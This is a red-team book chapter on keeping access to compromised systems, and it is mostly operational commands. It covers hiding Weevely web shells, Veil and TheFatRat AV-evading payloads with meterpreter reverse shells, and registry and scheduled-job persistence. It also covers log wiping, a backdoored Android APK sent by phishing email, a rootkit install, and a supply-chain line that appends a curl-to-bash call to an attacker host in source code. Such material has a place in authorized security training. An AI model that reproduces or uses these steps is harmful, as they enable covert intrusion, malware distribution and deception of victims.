# Chapter 12: Maintaining Access

Once you've successfully gained access to a target system, maintaining that access becomes a critical concern for red teamers. This chapter explores sophisticated tools for creating backdoors, managing web shells, and establishing persistent access mechanisms that can withstand system reboots or defense measures.

## Introduction to Persistence Mechanisms

In red team operations, maintaining access is often more challenging than the initial compromise. When establishing persistence, you need to consider:

- Stealth (avoiding detection by security tools and administrators)
- Reliability (ensuring consistent access despite system changes)
- Resilience (implementing multiple fallback mechanisms)
- Authentication (preventing unauthorized access to your backdoors)

This chapter explores four powerful tools in the red teamer's arsenal for maintaining access across different platforms and scenarios.

## Weevely: Web Shell Management

Weevely is a sophisticated weaponized PHP web shell designed for post-exploitation tasks. Unlike simple web shells, Weevely provides an interactive shell-like interface with over 30 modules for post-exploitation activities.

### Basic Usage

To generate a web shell with Weevely:

```bash
weevely generate <password> <path/to/output/shell.php>
```

For example:

```bash
weevely generate s3cr3tP4ssw0rd /tmp/backdoor.php
```

This creates a highly obfuscated PHP file that can be uploaded to the target web server through vulnerable file upload mechanisms, compromised FTP credentials, or other means.

Once uploaded, connect to your shell:

```bash
weevely http://target.com/uploads/backdoor.php s3cr3tP4ssw0rd
```

### Stealth Configuration

Weevely excels at evading detection through several techniques:

#### 1. Obfuscated Communications

Weevely uses HTTP as its carrier protocol, making it difficult to distinguish from normal web traffic. All commands are encoded before transmission:

```bash
# Enable stealth mode with reduced network footprint
weevely http://target.com/uploads/backdoor.php s3cr3tP4ssw0rd -s
```

#### 2. Fileless Operations

Minimize file system artifacts with Weevely's memory-only operations:

```bash
# Load PHP code directly into memory without writing to disk
:audit_phpconf
:system_info
:file_mount -remote http://attacker-server.com/tools/lateral.php
```

#### 3. Traffic Masking

Configure Weevely to blend in with legitimate traffic patterns:

```bash
# Set custom user agent to mimic legitimate browsers
:set agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# Add random delays between commands to evade timing analysis
:set delay=2-7
```

### Example: Creating Undetectable Backdoors

This example demonstrates creating a backdoor that persists through web server restarts while remaining undetectable:

1. Generate a stealthy PHP web shell:

```bash
weevely generate RedT3amAccess /tmp/wp-cache.php
```

2. Upload the web shell to a location that appears legitimate, such as within a WordPress installation in `/wp-content/cache/wp-cache.php`

3. Connect to your backdoor:

```bash
weevely http://target.com/wp-content/cache/wp-cache.php RedT3amAccess
```

4. Establish multi-layered persistence:

```bash
# Backdoor the legitimate index.php with a fileless loader
:file_edit -target /var/www/html/index.php -f /tmp/injector.php

# Create a cron job for periodic reconnection
:backdoor_meterpreter -payload linux/x64/meterpreter/reverse_tcp -lhost 192.168.1.100 -lport 4444 -time "*/30 * * * *"

# Create an Apache module backdoor (requires root)
:backdoor_apachemod
```

5. Cover your tracks:

```bash
# Clear logs that might reveal the backdoor
:audit_clearlog

# Remove evidence of your commands
:file_clearhistory
```

This creates a multi-layered persistence mechanism that maintains access even if one backdoor is discovered.

## Cowrie: SSH Honeypot

While primarily a defensive tool, red teamers can benefit from understanding Cowrie to:
1. Learn defensive SSH monitoring techniques
2. Test their own SSH-based backdoors against detection
3. Deploy as a decoy to distract blue teams from actual backdoors

### Installation and Setup

```bash
# Clone the repository
git clone https://github.com/cowrie/cowrie.git
cd cowrie

# Set up a virtual environment
python3 -m venv cowrie-env
source cowrie-env/bin/activate

# Install dependencies
pip install --upgrade pip
pip install -r requirements.txt

# Copy the configuration file
cp etc/cowrie.cfg.dist etc/cowrie.cfg
```

Configure Cowrie to listen on a non-standard port and redirect traffic from port 22:

```bash
# Edit cowrie.cfg
listen_endpoints = tcp:2222:interface=0.0.0.0

# Set up port forwarding (as root)
iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
```

### Example: Setting up SSH Attack Monitoring

This example demonstrates how to configure Cowrie to monitor for SSH attacks while learning how SSH-based backdoor detection works:

1. Configure realistic system information to make the honeypot believable:

```bash
# Edit cowrie.cfg
hostname = prod-db-server
kernel_version = 5.4.0-42-generic
kernel_build_string = #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020
hardware_platform = x86_64
operating_system = GNU/Linux
```

2. Add credible user accounts:

```bash
# Edit userdb.txt
admin:x:admin:1:0:0
jenkins:x:jenkins2022:1:0:0
root:x:Sup3rS3cur3P@ss:1:0:0
```

3. Start the honeypot:

```bash
bin/cowrie start
```

4. Analyze SSH attack patterns:

```bash
# View live connection attempts
tail -f var/log/cowrie/cowrie.log

# Review session recordings
cd var/lib/cowrie/downloads
# Or playback a session
bin/playlog var/lib/cowrie/tty/[session].log
```

By understanding how Cowrie detects and logs SSH interaction, you can improve your own SSH backdoor techniques to avoid similar detection mechanisms.

## Veil Framework: Payload Generation

The Veil Framework is an advanced tool for generating undetectable payloads that can bypass antivirus solutions. It's particularly useful for maintaining access through executable backdoors.

### Installation

If not already installed on your Kali or Parrot OS:

```bash
apt update
apt install veil
/usr/share/veil/config/setup.sh --force --silent
```

### Basic Usage

```bash
veil

# Select Evasion for AV-evading payloads
use 1

# List available payload types
list

# Example: C# payload
use 15

# Set options
set LHOST 192.168.1.100
set LPORT 443
set EXPIRE_PAYLOAD Y
set EXPIRE_DATE 01/01/2023

# Generate the payload
generate
```

### AV Evasion Techniques

Veil incorporates multiple evasion techniques:

#### 1. Encryption and Obfuscation

```bash
# Python payload with AES encryption
use 29
set ENCRYPTION aes256
set INTERVAL 10
```

#### 2. Memory-Only Execution

```bash
# PowerShell payload with in-memory execution
use 21
set INJECT_METHOD Virtual
```

#### 3. Sandbox Detection

```bash
# Add sandbox detection
set SANDBOX_CHECK True
```

### Example: Creating Persistent Backdoors

This example creates a payload that maintains persistence across reboots:

1. Generate a stealthy executable:

```bash
veil
use 1
use 7  # C/meterpreter/rev_tcp

set LHOST 192.168.1.100
set LPORT 8443
set SLEEP 10
set LURI /updates

# Enable cleanup to remove artifacts
set CLEANUP True

generate
```

2. Implement persistence:

```bash
# On the target system after payload execution
meterpreter > run persistence -X -i 60 -p 443 -r 192.168.1.100
meterpreter > run scheduleme -m 1 -l c:\windows\temp
meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v WindowsUpdate -d "c:\windows\temp\update.exe"
```

3. Create multiple redundant persistence mechanisms:

```bash
# WMI persistence
meterpreter > run winenum
meterpreter > load powershell
meterpreter > powershell_execute "$job = Register-ScheduledJob -Name WindowsUpdate -ScriptBlock {c:\windows\temp\update.exe} -Trigger (New-JobTrigger -AtStartup)"
```

This establishes persistence through multiple methods, ensuring access even if one method is discovered.

## TheFatRat: Backdoor Creator

TheFatRat is a comprehensive backdoor creation tool that can generate sophisticated multi-platform payloads, particularly effective for Android devices.

### Installation

If not already installed:

```bash
git clone https://github.com/Screetsec/TheFatRat.git
cd TheFatRat
chmod +x setup.sh
./setup.sh
```

### Basic Usage

```bash
fatrat

# Choose option 1 for backdoor with original app
# Choose option 6 for Android backdoor
# Choose option 10 for PowerShell attacks
```

### Multi-platform Payloads

TheFatRat can create backdoors for various platforms:

#### 1. Windows Backdoors

```bash
# From the main menu
1  # Create Backdoor with Executable (FUD)

# Select payload type
1  # windows/meterpreter/reverse_tcp

# Set parameters
set LHOST 192.168.1.100
set LPORT 443
```

#### 2. Macro-Embedded Documents

```bash
# From the main menu
3  # Create Fud Backdoor with Microsoft Office

# Select document type
1  # Microsoft Word
```

#### 3. Backdoored APK Files

```bash
# From the main menu
6  # Android Payload & Listener

# Select backdoor type
1  # Embed Payload In Original APK
```

### Example: Android Backdoor Deployment

This example demonstrates creating and deploying an Android backdoor:

1. Identify a legitimate application to backdoor:

```bash
# Download a legitimate APK (for example, a game)
wget https://example.com/legitimate_app.apk -O /tmp/original.apk
```

2. Create the backdoored application:

```bash
fatrat

# Select option 6 (Android)
6

# Select option 1 (Original APK Backdoor)
1

# Provide path to the original APK
/tmp/original.apk

# Set listener details
LHOST: 192.168.1.100
LPORT: 4444

# Name the output file
backdoored_app.apk
```

3. Sign the APK with a legitimate-looking certificate:

```bash
# Generate signing key
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000

# Sign the APK
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore backdoored_app.apk alias_name
```

4. Set up social engineering to deploy the application:

```bash
# Create a convincing phishing email with sendemail
sendemail -xu your_email@gmail.com -xp password -s smtp.gmail.com:587 -f your_email@gmail.com -t victim@target.com -u "Security Update Required" -m "Please install this security update on your company phone immediately." -a backdoored_app.apk

# Or create a fake download website with Social Engineering Toolkit
setoolkit
1  # Social Engineering Attacks
2  # Website Attack Vectors
3  # Credential Harvester
2  # Site Cloner
```

5. Set up the listener to receive connections:

```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit -j
```

When the victim installs and runs the application, you'll receive a meterpreter session that persists across application restarts.

## Advanced Persistence Techniques

Beyond the tools covered above, consider these additional persistence techniques:

### 1. Kernel-Level Rootkits

For the most sophisticated persistence, kernel-level rootkits provide nearly undetectable access:

```bash
# Compile and install a basic LKM rootkit (in a lab environment only)
git clone https://github.com/f0rb1dd3n/Reptile.git
cd Reptile
make
insmod reptile_mod.ko

# Connect to the hidden backdoor
nc -v 127.0.0.1 5678
```

### 2. Supply Chain Persistence

Modify source packages to include backdoors:

```bash
# Backdoor a source package
git clone https://github.com/target/project.git
cd project
# Add backdoor code to a rarely-accessed source file
echo 'system("curl http://attacker.com/beacon | bash");' >> src/utils/logger.c
# Submit as a "bug fix" or compile and distribute
```

### 3. UEFI/BIOS Persistence

The ultimate persistence mechanism operates below the operating system:

```bash
# Tools like Chipsec can help understand and implant UEFI persistence
git clone https://github.com/chipsec/chipsec.git
cd chipsec
python setup.py build_ext -i
python chipsec_main.py -m common.uefi.access
```

## Conclusion

Maintaining access requires creative thinking and multiple layers of persistence. The tools covered in this chapter provide powerful capabilities for establishing backdoors across various platforms and scenarios.

Remember that as a professional red teamer, your objective is to help organizations discover and remediate weaknesses. Always operate within the scope of your engagement and with proper authorization.

In the next chapter, we'll explore techniques for data exfiltration once you've established persistent access.
